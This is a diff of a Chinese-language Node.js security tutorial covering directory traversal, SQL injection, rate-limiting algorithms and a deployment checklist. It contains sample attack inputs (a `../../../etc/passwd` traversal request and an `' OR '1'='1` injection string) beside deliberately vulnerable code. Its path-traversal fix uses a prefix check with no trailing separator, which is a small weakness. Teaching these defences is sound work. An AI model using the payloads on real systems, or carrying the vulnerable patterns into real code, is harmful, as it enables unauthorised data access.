+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+      - run: npm ci
+      - uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+```
+
+3. **锁定版本**
+
+```json
+{
+	"dependencies": {
+		"lodash": "4.17.21"
+	}
+}
+```
+
+```bash
+# 生成 lock 文件后，每次安装的都是完全相同的版本
+npm ci
+```
+
+4. **使用私有镜像**
+
+对于核心依赖，考虑 fork 一份到自己控制的仓库，定期检查更新。
+
+### 5.4 目录遍历
+
+这个漏洞的原因是服务器在处理文件路径时，没有检查用户输入的路径是否在预期范围内。
+
+```javascript
+// 有问题的代码
+app.get('/download', (req, res) => {
+	const file = req.query.file
+	// 直接拼接路径，没有检查
+	res.sendFile(__dirname + '/files/' + file)
+})
+```
+
+攻击者输入：
+
+```
+GET /download?file=../../../etc/passwd
+```
+
+服务器实际读取的是 `/var/www/yourapp/files/../../../etc/passwd`，等价于 `/etc/passwd`。
+
+**攻击路径：**
+
+```mermaid
+flowchart TD
+    Request["📝 GET /download?file=../../../etc/passwd"] --> App["🖥️ Node.js 应用"]
+    App -->|"拼接路径"| Path["📁 /var/www/app/files/../../../etc/passwd"]
+    Path -->|"等价于"| Final["📁 /etc/passwd"]
+    Final -->|"读取系统文件"| Content["🔓 敏感内容泄露"]
+```
+
+**防护：路径规范化**
 
 ```javascript
 import path from 'node:path'
-const base = '/var/data/'
+import fs from 'node:fs'
+
 app.get('/download', (req, res) => {
-	const file = req.query.file
-	const fullPath = path.normalize(path.join(base, file))
-	if (!fullPath.startsWith(base)) {
-		return res.status(403).send('Invalid path')
+	const requestedFile = req.query.file
+
+	// 安全目录
+	const baseDir = path.join(__dirname, 'files')
+
+	// 规范化路径
+	const filePath = path.normalize(path.join(baseDir, requestedFile))
+
+	// 确保最终路径在安全目录内
+	if (!filePath.startsWith(baseDir)) {
+		return res.status(403).json({ error: '非法路径' })
 	}
-	res.sendFile(fullPath)
+
+	// 检查文件是否存在且是文件
+	if (!fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) {
+		return res.status(404).json({ error: '文件不存在' })
+	}
+
+	res.sendFile(filePath)
+})
+```
+
+### 5.5 SQL 注入
+
+虽然用 Node.js 的时候很多人会用 ORM，但还是有必要了解一下 SQL 注入的原理。
+
+**有问题的代码：**
+
+```javascript
+// ❌ 绝对不要这样做
+const sql = `SELECT * FROM users WHERE name = '${username}'`
+db.query(sql)
+
+// 攻击者输入 username: "' OR '1'='1"
+// 实际执行的 SQL:
+// SELECT * FROM users WHERE name = '' OR '1'='1'
+// 结果：返回所有用户！
+```
+
+**正确的做法：参数化查询**
+
+```javascript
+// ✅ 使用参数化查询
+const sql = 'SELECT * FROM users WHERE name = ?'
+db.query(sql, [username])
+
+// 或者用 ORM
+const user = await db.user.findFirst({
+	where: { name: username },
 })
 ```
 
 ---
 
-### 9. 其他漏洞
+## 六、应用访问限流
 
-- **SQL 注入**：使用 Prisma/TypeORM 等现代 ORM，或严格使用参数化查询。
-- **密码哈希**：**Argon2** 是 2026 年的安全首选，提供了极强的内存抗性，其次是 **bcrypt**。
-- **反序列化**：严禁 `eval` 或 `node-serialize`，仅允许标准 `JSON.parse`。
-- **安全配置**：使用 `helmet` 设置安全响应头。
-- **日志注入**：在记录前转义用户输入的换行符等控制字符。
+限流不是严格意义上的"安全漏洞"，但它是保护系统不被恶意请求打垮的重要手段。
 
-```javascript
-// 使用 Argon2 快速哈希（示例）
-import { hash } from 'argon2'
-const hashed = await hash(password);
-```
+想象一下：有人写了脚本，一秒钟给你发一万个请求。你的服务器拼命处理这些无效请求，真正的用户反而打不开了。这就是 DoS（拒绝服务）攻击。
 
----
+限流就是为了解决这个问题。
 
-## 二、应用访问限流
+### 6.1 固定窗口计数器
 
-限流是保障服务稳定的重要手段。下面用示意图对比四种常见算法。
-
-### 1. 固定窗口计数器
+最简单的方式，固定一段时间内允许的请求数。
 
 ```mermaid
 flowchart TD
-    subgraph 时间窗口1[0:00-1:00]
-        A[请求1-100] --> 允许
-        B[请求101] --> 拒绝
+    subgraph 窗口1["⏰ 窗口 1 (0:00 - 1:00)"]
+        A1["第 1-100 个请求"] --> OK1[允许通过]
+        A2["第 101 个请求"] --> NO1[拒绝]
     end
-    subgraph 时间窗口2[1:00-2:00]
-        C[请求1-100] --> 允许
+
+    subgraph 窗口2["⏰ 窗口 2 (1:00 - 2:00)"]
+        B1["第 1-100 个请求"] --> OK2[允许通过]
+        B2["第 101 个请求"] --> NO2[拒绝]
     end
-    Note[问题：窗口边界可能突发2倍流量<br>如0:59秒100请求，1:00秒100请求，实际1秒内200请求]
+
+    Note1["⚠️ 潜在问题："]
+    Note1 --> Note2["在 0:59 来了 100 个请求"]
+    Note2 --> Note3["在 1:00 来了 100 个请求"]
+    Note3 --> Note4["实际 1 秒内处理了 200 个请求！"]
 ```
+
+**代码实现：**
 
 ```javascript
 import rateLimit from 'express-rate-limit'
 
-// 创建限流器：每分钟最多100次请求
 const limiter = rateLimit({
-	windowMs: 60 * 1000, // 1分钟
-	max: 100, // 最多100个请求
-	message: '请求过于频繁，请稍后再试',
-	headers: true, // 返回 X-RateLimit-* 头
-	keyGenerator: (req) => req.ip, // 按IP限流
+	windowMs: 60 * 1000, // 时间窗口：1 分钟
+	max: 100, // 最多 100 个请求
+	message: '请求太频繁了，请稍后再试',
+	standardHeaders: true, // 返回 RateLimit-* 头
+	legacyHeaders: false,
+	keyGenerator: (req) => {
+		// 按 IP 限流（也可以改成按用户 ID）
+		return req.ip
+	},
 })
 
-app.use('/api/', limiter)
+app.use('/api', limiter)
 ```
 
-### 2. 滑动窗口计数器
+### 6.2 滑动窗口计数器
+
+解决了固定窗口的"边界突刺"问题。把时间窗口切分成多个小段，计算加权平均值。
 
 ```mermaid
 flowchart TD
-    subgraph 滑动窗口["滑动窗口：当前时间前推1分钟"]
-        T1["0-10s: 20次"] --> T2["10-20s: 15次"] --> T3["20-30s: 25次"] --> T4["30-40s: ..."]
+    subgraph 滑动窗口["🔄 滑动窗口算法"]
+        subgraph 时间线["📅 最近 60 秒"]
+            T1["0-10秒: 20个"] --> T2["10-20秒: 15个"]
+            T2 --> T3["20-30秒: 25个"]
+            T3 --> T4["30-40秒: 10个"]
+            T4 --> T5["40-50秒: 18个"]
+            T5 --> T6["50-60秒: 12个"]
+        end
+        Note["总数：100 个请求（假设限制是 100）"]
+        Note2["更平滑的限流，避免边界瞬间爆发"]
     end
-
-    Note["通过细分时间段加权计算，消除边界毛刺"]
 ```
 
+**代码实现：**
+
 ```javascript
-// 滑动窗口示例（参考）
-class FastSlidingWindow {
-	constructor(windowSizeMs, limit) {
-		this.windowSizeMs = windowSizeMs
-		this.limit = limit
-		this.requests = []
-		this.head = 0 // 指向窗口内第一个有效元素
+class SlidingWindowRateLimiter {
+	constructor(windowMs, maxRequests) {
+		this.windowMs = windowMs
+		this.maxRequests = maxRequests
+		this.requests = new Map() // { ip: [timestamp1, timestamp2, ...] }
 	}
 
-	allow() {
+	isAllowed(ip) {
 		const now = Date.now()
-		const threshold = now - this.windowSizeMs
+		const windowStart = now - this.windowMs
 
-		// 仅仅移动指针，不触发数组重排
-		while (this.head < this.requests.length && this.requests[this.head] <= threshold) {
-			this.head++
+		// 获取该 IP 的历史请求记录
+		if (!this.requests.has(ip)) {
+			this.requests.set(ip, [])
 		}
 
-		// 为了防止内存无限增长，定期进行真正的清理
-		if (this.head > 1000) {
-			this.requests = this.requests.slice(this.head)
-			this.head = 0
+		const timestamps = this.requests.get(ip)
+
+		// 只保留窗口内的请求
+		const validTimestamps = timestamps.filter((t) => t > windowStart)
+		this.requests.set(ip, validTimestamps)
+
+		// 检查是否超限
+		if (validTimestamps.length >= this.maxRequests) {
+			return { allowed: false, remaining: 0 }
 		}
 
-		if (this.requests.length - this.head < this.limit) {
-			this.requests.push(now)
-			return true
-		}
-
-		return false
+		// 记录这次请求
+		validTimestamps.push(now)
+		return { allowed: true, remaining: this.maxRequests - validTimestamps.length }
 	}
 }
 
-// 使用示例
-const limiter = new FastSlidingWindow(60000, 100) // 每分钟限制 100 次
+const limiter = new SlidingWindowRateLimiter(60 * 1000, 100)
+
+app.use('/api', (req, res, next) => {
+	const ip = req.ip
+	const { allowed, remaining } = limiter.isAllowed(ip)
+
+	res.setHeader('X-RateLimit-Remaining', remaining)
+
+	if (!allowed) {
+		return res.status(429).json({ error: '请求过于频繁' })
+	}
+
+	next()
+})
 ```
 
-### 3. 漏桶算法
+### 6.3 漏桶算法
+
+想象一个底部有洞的桶。水（请求）从顶部流入，从底部以固定速率流出。桶满了，新来的水就会溢出（被拒绝）。
 
 ```mermaid
 flowchart TD
-    Requests[请求] -->|入桶| Bucket[漏桶<br>（队列）]
-    Bucket -->|固定速率流出| Process[处理]
-    Bucket -->|桶满则丢弃| Drop[拒绝]
-```
+    subgraph 漏桶["🪣 漏桶"]
+        Input["📥 请求流入"] --> Bucket["桶<br/>（队列）"]
+        Bucket -->|"固定速率流出"| Output["⚙️ 处理"]
+        Bucket -->|"桶满则丢弃"| Drop["❌ 拒绝"]
 
-### 4. 令牌桶算法
-
-```mermaid
-flowchart TD
-    subgraph 令牌桶
-        Tokens[令牌<br>容量N]
-        Add[定时添加令牌]
+        Rate["漏水的速率<br/>(每秒处理 N 个)"]
+        Bucket -.-> Rate
     end
-    Request -->|消耗1令牌| Tokens -->|有令牌| Allow[允许]
-    Tokens -->|无令牌| Deny[拒绝]
+
+    Note1["特点："]
+    Note1 --> Note2["请求以任意速率到来"]
+    Note2 --> Note3["处理速率恒定"]
+    Note3 --> Note4["适合需要匀速处理的场景"]
 ```
 
-**Node.js 实现**
+**代码实现：**
 
 ```javascript
-// 简单令牌桶实现（参考）
-class TokenBucket {
-	constructor(capacity, fillPerSecond) {
-		this.capacity = capacity
-		this.tokens = capacity
-		this.fillPerSecond = fillPerSecond
-		this.lastRefill = Date.now()
+class LeakyBucket {
+	constructor(capacity, leakRatePerSecond) {
+		this.capacity = capacity // 桶的容量
+		this.water = 0 // 当前水量
+		this.leakRate = leakRatePerSecond // 每秒漏水量
+		this.lastLeakTime = Date.now()
 	}
+
+	drop() {
+		this.leak()
+
+		if (this.water < this.capacity) {
+			this.water++
+			return true // 可以处理
+		}
+		return false // 桶满了，拒绝
+	}
+
+	leak() {
+		const now = Date.now()
+		const elapsed = (now - this.lastLeakTime) / 1000 // 秒
+		const leaked = elapsed * this.leakRate
+
+		this.water = Math.max(0, this.water - leaked)
+		this.lastLeakTime = now
+	}
+}
+
+const bucket = new LeakyBucket(100, 10) // 容量 100，每秒处理 10 个
+
+app.use('/api', (req, res, next) => {
+	if (bucket.drop()) {
+		next()
+	} else {
+		res.status(429).json({ error: '服务器繁忙，请稍后再试' })
+	}
+})
+```
+
+### 6.4 令牌桶算法
+
+这是最灵活的限流算法。桶里放令牌，请求来了必须拿走一个令牌才能被处理。令牌按固定速率生成，但可以累积（不超过桶容量）。
+
+```mermaid
+flowchart TD
+    subgraph 令牌桶["🎫 令牌桶"]
+        subgraph 桶["🪣 令牌桶（容量 N）"]
+            T1["令牌"]
+            T2["令牌"]
+            T3["令牌"]
+            T4["..."]
+        end
+
+        Add["⏰ 定时添加令牌"] -.-> T1
+
+        Request1["请求1"] -->|取走令牌| T1
+        Request2["请求2"] -->|取走令牌| T2
+        Request3["请求3"] -->|取走令牌| T3
+        Request4["请求4"] -->|"无令牌可取"| Reject["❌ 拒绝"]
+    end
+
+    Note["特点："]
+    Note --> Note2["支持突发流量"]
+    Note2 --> Note3["平时积累令牌"]
+    Note3 --> Note4["流量高峰时一次性使用"]
+```
+
+**代码实现：**
+
+```javascript
+class TokenBucket {
+	constructor(capacity, refillRatePerSecond) {
+		this.capacity = capacity // 桶容量
+		this.tokens = capacity // 当前令牌数
+		this.refillRate = refillRatePerSecond // 每秒补充令牌数
+		this.lastRefillTime = Date.now()
+	}
+
 	take() {
 		this.refill()
+
 		if (this.tokens >= 1) {
 			this.tokens -= 1
 			return true
 		}
 		return false
 	}
+
 	refill() {
 		const now = Date.now()
-		const elapsed = (now - this.lastRefill) / 1000
-		this.tokens = Math.min(this.capacity, this.tokens + elapsed * this.fillPerSecond)
-		this.lastRefill = now
+		const elapsed = (now - this.lastRefillTime) / 1000
+		const tokensToAdd = elapsed * this.refillRate
+
+		this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd)
+		this.lastRefillTime = now
 	}
 }
 
-// 中间件使用
-const bucket = new TokenBucket(100, 10) // 容量100，每秒填充10个
-app.use((req, res, next) => {
+const bucket = new TokenBucket(100, 10) // 最多积攒 100 个令牌，每秒补充 10 个
+
+app.use('/api', (req, res, next) => {
 	if (bucket.take()) {
 		next()
 	} else {
-		res.status(429).send('Too Many Requests')
+		res.status(429).json({
+			error: '请求过于频繁',
+			retryAfter: 1, // 建议 1 秒后重试
+		})
 	}
+})
+```
+
+### 6.5 四种算法对比
+
+| 算法     | 优点     | 缺点         | 适用场景           |
+| -------- | -------- | ------------ | ------------------ |
+| 固定窗口 | 实现简单 | 边界突刺     | 对精度要求不高     |
+| 滑动窗口 | 精度高   | 实现复杂     | API 限流           |
+| 漏桶     | 流量平滑 | 无法处理突发 | 消息队列、API 网关 |
+| 令牌桶   | 支持突发 | 实现较复杂   | 限流、流量整形     |
+
+### 6.6 分布式限流
+
+单机限流只能保护单台服务器，真正的限流需要全局视角。
+
+**Redis + 滑动窗口实现：**
+
+```javascript
+import Redis from 'ioredis'
+
+const redis = new Redis(process.env.REDIS_URL)
+
+async function slidingWindowRateLimit(key, windowMs, maxRequests) {
+	const now = Date.now()
+	const windowStart = now - windowMs
+
+	const multi = redis.multi()
+
+	// 移除窗口外的记录
+	multi.zremrangebyscore(key, 0, windowStart)
+
+	// 添加当前请求
+	multi.zadd(key, now, `${now}-${Math.random()}`)
+
+	// 获取窗口内请求数
+	multi.zcard(key)
+
+	// 设置过期时间
+	multi.expire(key, Math.ceil(windowMs / 1000))
+
+	const results = await multi.exec()
+	const requestCount = results[2][1]
+
+	return {
+		allowed: requestCount <= maxRequests,
+		remaining: Math.max(0, maxRequests - requestCount),
+	}
+}
+
+app.use('/api', async (req, res, next) => {
+	const key = `ratelimit:${req.ip}`
+	const { allowed, remaining } = await slidingWindowRateLimit(
+		key,
+		60 * 1000, // 1 分钟
+		100, // 100 次请求
+	)
+
+	res.setHeader('X-RateLimit-Remaining', remaining)
+
+	if (!allowed) {
+		return res.status(429).json({ error: '请求过于频繁' })
+	}
+
+	next()
 })
 ```
 
 ---
 
-## 三、高可用三大利器关系
+## 七、安全三剑客：限流、缓存、降级
 
-限流、缓存、降级共同保障系统在高负载下仍能提供核心服务。
+高可用系统离不开三板斧：限流、缓存、降级。它们相互配合，共同保护系统在极端情况下依然能提供服务。
 
 ```mermaid
 flowchart TD
-    A[高可用] --> B[限流]
-    A --> C[缓存]
-    A --> D[降级]
+    subgraph 高可用三剑客["🛡️ 高可用三剑客"]
+        A[🔒 限流]
+        B[⚡ 缓存]
+        C[📉 降级]
+    end
 
-    B --> |保护后端| E[防止资源耗尽]
-    C --> |加速响应| F[减少后端压力]
-    D --> |牺牲非核心功能| G[保证核心可用]
+    A -->|"保护后端"| A1["防止资源耗尽"]
+    A1 --> A2["服务器不会被压垮"]
 
-    style A fill:#f9f,stroke:#333
-    style B fill:#ccf,stroke:#333
-    style C fill:#cfc,stroke:#333
-    style D fill:#fcf,stroke:#333
+    B -->|"加速响应"| B1["减少数据库压力"]
+    B1 --> B2["用户体验更流畅"]
+
+    C -->|"牺牲非核心"| C1["保证核心功能可用"]
+    C1 --> C2["系统整体不崩溃"]
+
+    style A fill:#ff6b6b,color:#fff
+    style B fill:#4ecdc4,color:#fff
+    style C fill:#45b7d1,color:#fff
 ```
 
-**为什么淘宝每年还是容易挂掉？**
+**举例说明：**
 
-- 流量峰值远超预估，即使限流也可能触发全局限流导致用户体验下降。
-- 依赖的数据库、缓存等基础组件成为瓶颈。
-- 人为失误或代码 Bug 引发雪崩。
-- 基础设施故障（光缆被挖、电力中断）。
-
-安全与高可用是系统工程，需要从架构、运维、代码等多维度持续投入。
+- **限流**：双十一每秒 100 万人下单，但我只能处理 10 万，那就只能让 90 万人排队或返回"稍后再试"
+- **缓存**：大部分数据其实变化不频繁，用缓存挡掉 90% 的请求，减轻数据库压力
+- **降级**：图片验证码计算太慢，那就暂时关闭，改成短信验证，等高峰期过了再恢复
 
 ---
 
-## 结语
+## 八、总结：安全 checklist
 
-本文通过图例和代码，梳理了 Node.js 应用常见的 10 余种安全漏洞及其防护，同时介绍了限流算法。安全无小事，开发者应时刻保持警惕，将安全内化到开发生命周期。希望这些内容能帮助你构建更健壮的 Node.js 应用。
+最后给你列一个清单，每次上线前对照检查一遍：
+
+### 请求验证
+
+- [ ] 所有用户输入都做了验证和过滤
+- [ ] 使用参数化查询，防止 SQL 注入
+- [ ] 使用 ORM 的安全特性
+
+### 身份认证
+
+- [ ] 使用安全的密码哈希算法（Argon2 或 bcrypt）
+- [ ] Session/Cookie 设置了 httpOnly、secure、sameSite
+- [ ] 实现 CSRF 防护
+
+### 授权控制
+
+- [ ] 所有接口都有权限检查
+- [ ] 使用 UUID 或随机 ID，避免可预测的 ID
+- [ ] 验证资源所有权，不能只靠 URL 参数
+
+### 敏感数据
+
+- [ ] 敏感数据加密存储
+- [ ] API 不返回不必要的敏感信息
+- [ ] 日志不记录密码、Token 等敏感信息
+
+### 网络安全
+
+- [ ] 使用 HTTPS
+- [ ] 设置 CSP、X-Frame-Options 等安全头
+- [ ] 限流防止 DoS
+
+### 依赖安全
+
+- [ ] 定期运行 `npm audit`
+- [ ] 使用自动化工具检查依赖
+- [ ] 锁死依赖版本
+
+### 错误处理
+
+- [ ] 生产环境关闭详细错误堆栈
+- [ ] 统一错误响应格式
+- [ ] 日志记录异常但不暴露敏感信息
+
+---
+
+安全不是一次性的工作，而是持续的过程。希望这篇文章能帮你建立起安全意识，在日常开发中多想一步：用户会不会用这个功能来搞我？
+
+多一分警惕，少一分损失。祝你的应用固若金汤！
